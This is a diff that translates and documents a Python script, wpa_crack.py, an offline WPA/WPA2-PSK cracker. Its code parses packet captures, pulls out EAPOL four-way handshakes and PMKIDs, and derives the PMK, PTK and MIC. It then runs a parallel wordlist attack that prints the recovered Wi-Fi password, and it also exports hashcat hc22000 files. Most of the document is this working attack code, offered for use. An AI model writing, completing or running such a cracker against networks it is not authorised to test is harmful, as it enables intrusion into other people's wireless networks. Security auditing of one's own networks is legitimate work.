@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
 # language: Python 3.9+, file: wpa_crack.py, target: WPA/WPA2-PSK 4-way handshake + PMKID
-# deps: NENHUMA (só stdlib). Não usa aircrack nem hashcat.
+# deps: NONE (stdlib only). No aircrack, no hashcat required.
 # usage:
-#   python wpa_crack.py captura.cap -w rockyou.txt -t 8
-#   python wpa_crack.py captura.cap --export-22000 out.22000      # pro hashcat -m 22000
-#   python wpa_crack.py captura.cap -w words.txt -u SSID          # filtra por SSID
+#   python wpa_crack.py capture.cap -w rockyou.txt -t 8
+#   python wpa_crack.py capture.cap --export-22000 out.22000      # for hashcat -m 22000
+#   python wpa_crack.py capture.cap -w words.txt -u SSID          # filter by SSID
 
 import argparse
 import hashlib
@@ -15,7 +15,7 @@ import time
 from multiprocessing import Pool, cpu_count, Event
 
 # ============================================================
-#  PARSING: pcap/pcapng -> frames 802.11 -> EAPOL-key
+#  PARSING: pcap/pcapng -> 802.11 frames -> EAPOL-key
 # ============================================================
 
 def parse_pcap(path):
@@ -30,7 +30,7 @@ def parse_pcap(path):
     elif magic == b"\xa1\xb2\xc3\xd4":
         endian = ">"
     else:
-        raise ValueError("nao e um pcap/pcapng valido")
+        raise ValueError("not a valid pcap/pcapng file")
 
     linktype = struct.unpack(endian + "I", blob[20:24])[0]
     pkts, off = [], 24
@@ -59,6 +59,7 @@ def parse_pcapng(blob):
 
 
 def get_80211(pkt, linktype):
+    """Strip the link-layer header and return the raw 802.11 frame."""
     if linktype == 127:                    # radiotap
         if len(pkt) < 4:
             return None
@@ -87,15 +88,15 @@ def parse_ssid(fr):
 
 
 def extract_eapol(fr):
-    """data frame -> (src, dst, bssid, eapol_bytes)"""
+    """802.11 data frame -> (src, dst, bssid, eapol_bytes) or None."""
     if len(fr) < 24:
         return None
     fc = struct.unpack("<H", fr[0:2])[0]
-    if (fc >> 2) & 0x3 != 2:               # não é data
+    if (fc >> 2) & 0x3 != 2:               # not a data frame
         return None
     subtype = (fc >> 4) & 0xF
     addr1, addr2, addr3 = fr[4:10], fr[10:16], fr[16:22]
-    hdr = 26 if (subtype & 0x08) else 24   # QoS +2
+    hdr = 26 if (subtype & 0x08) else 24   # QoS adds 2 bytes
     if len(fr) < hdr + 8:
         return None
     if fr[hdr:hdr+8] != b"\xaa\xaa\x03\x00\x00\x00\x88\x8e":
@@ -104,6 +105,7 @@ def extract_eapol(fr):
 
 
 def parse_eapol_key(e):
+    """Decode the EAPOL-Key header into its meaningful fields."""
     if len(e) < 4 or e[1] != 3:
         return None
     ki = struct.unpack(">H", e[5:7])[0]
@@ -120,6 +122,7 @@ def parse_eapol_key(e):
 
 
 def parse_pmkid_kde(keydata):
+    """Scan the RSN key-data encapsulation for a PMKID (vendor IE 00:0f:ac:04)."""
     pos = 0
     while pos + 2 <= len(keydata):
         t, l = keydata[pos], keydata[pos+1]
@@ -130,15 +133,17 @@ def parse_pmkid_kde(keydata):
     return None
 
 # ============================================================
-#  CRYPTO: PMK -> PTK -> KCK -> MIC  (o coração do mecanismo)
+#  CRYPTO: PMK -> PTK -> KCK -> MIC  (the core of the mechanism)
 # ============================================================
 
 def pmk(pw, ssid):
+    """PBKDF2-SHA1(passphrase, ssid, 4096, 32) — the WPA/WPA2 PSK."""
     p = pw if isinstance(pw, bytes) else pw.encode()
     return hashlib.pbkdf2_hmac("sha1", p, ssid, 4096, 32)
 
 
 def prf512(k, ap, sta, anonce, snonce):
+    """IEEE 802.11 PRF-512: derive the 64-byte PTK from the PMK and the nonces."""
     a = ap + sta if ap < sta else sta + ap
     b = anonce + snonce if anonce < snonce else snonce + anonce
     out, i = b"", 0
@@ -150,21 +155,24 @@ def prf512(k, ap, sta, anonce, snonce):
 
 
 def mic_ok(k, ap, sta, anonce, snonce, eapol, mic, ver):
+    """Recompute the EAPOL MIC with the candidate KCK and compare."""
     kck = prf512(k, ap, sta, anonce, snonce)[:16]
     frame = bytearray(eapol)
-    frame[81:97] = b"\x00" * 16            # zera o campo MIC antes de recalcular
+    frame[81:97] = b"\x00" * 16            # zero the MIC field before recomputing
     digest = hashlib.md5 if ver == 1 else hashlib.sha1
     return hmac.compare_digest(hmac.new(kck, bytes(frame), digest).digest()[:16], mic)
 
 
 def pmkid_ok(k, ap, sta, want):
+    """Check a candidate PMK against a captured PMKID."""
     return hmac.compare_digest(hmac.new(k, b"PMK Name" + ap + sta, hashlib.sha1).digest()[:16], want)
 
 # ============================================================
-#  COLETA + CRACK
+#  COLLECTION + CRACK
 # ============================================================
 
 def build_targets(path, ssid_filter):
+    """Parse a capture into crackable targets (handshakes + PMKIDs) per BSSID."""
     linktype, pkts = parse_pcap(path)
     ap_nonce = {}      # bssid -> [anonce...]
     sta_frames = {}    # bssid -> [(sta, snonce, mic, eapol, ver)...]
@@ -205,7 +213,7 @@ def build_targets(path, ssid_filter):
         if hs or pk:
             targets.append({"ssid": ssid.encode(), "ap": bssid,
                             "handshakes": hs, "pmkids": pk, "ssid_str": ssid})
-            print(f"[+] alvo: {ssid!r} bssid={bssid.hex()} hs={len(hs)} pmkid={len(pk)}")
+            print(f"[+] target: {ssid!r} bssid={bssid.hex()} hs={len(hs)} pmkid={len(pk)}")
     return targets
 
 
@@ -231,6 +239,7 @@ def _try(pw):
     return None
 
 def crack(targets, wordlist, threads):
+    """Stream the wordlist across a process pool until a candidate matches."""
     stop = Event()
     n = 0
     t0 = time.time()
@@ -240,20 +249,21 @@ def crack(targets, wordlist, threads):
             n += 1
             if n % 20000 == 0:
                 rate = n / (time.time() - t0)
-                print(f"[*] {n} testadas  {rate:0.0f} p/s", end="\r")
+                print(f"[*] {n} tried  {rate:0.0f} p/s", end="\r")
             if res:
                 stop.set()
                 pool.terminate()
-                print(f"\n[+] SENHA: {res[0]!r}  ssid={res[1]!r}  via={res[2]}")
+                print(f"\n[+] PASSWORD: {res[0]!r}  ssid={res[1]!r}  via={res[2]}")
                 return res
-    print(f"\n[-] nada em {n} candidatos ({time.time()-t0:.0f}s)")
+    print(f"\n[-] nothing in {n} candidates ({time.time()-t0:.0f}s)")
     return None
 
 # ============================================================
-#  EXPORT hc22000 (pro hashcat -m 22000)
+#  EXPORT hc22000 (for hashcat -m 22000)
 # ============================================================
 
 def export_22000(targets, out):
+    """Write handshakes/PMKIDs in hashcat's hc22000 format."""
     with open(out, "w") as f:
         for t in targets:
             ssid_hex = t["ssid"].hex()
@@ -265,26 +275,26 @@ def export_22000(targets, out):
             for p in t["pmkids"]:
                 f.write("WPA*01*%s*%s*%s*%s***\n" % (
                     p["pmkid"].hex(), ap, p["sta"].hex(), ssid_hex))
-    print(f"[+] escrito {out} — rode: hashcat -m 22000 {out} rockyou.txt")
+    print(f"[+] wrote {out} — run: hashcat -m 22000 {out} rockyou.txt")
 
 
 def main():
-    ap = argparse.ArgumentParser(description="cracker offline WPA/WPA2-PSK")
+    ap = argparse.ArgumentParser(description="offline WPA/WPA2-PSK cracker")
     ap.add_argument("capture")
     ap.add_argument("-w", "--wordlist")
     ap.add_argument("-t", "--threads", type=int, default=cpu_count())
-    ap.add_argument("-u", "--ssid", help="filtra por ESSID")
+    ap.add_argument("-u", "--ssid", help="filter by ESSID")
     ap.add_argument("--export-22000", metavar="FILE")
     a = ap.parse_args()
 
     targets = build_targets(a.capture, a.ssid)
     if not targets:
-        sys.exit("nenhum handshake/PMKID utilizavel na captura")
+        sys.exit("no usable handshake/PMKID in the capture")
     if a.export_22000:
         export_22000(targets, a.export_22000)
         return
     if not a.wordlist:
-        sys.exit("preciso de -w wordlist (ou use --export-22000)")
+        sys.exit("need -w wordlist (or use --export-22000)")
     crack(targets, a.wordlist, a.threads)
 
 
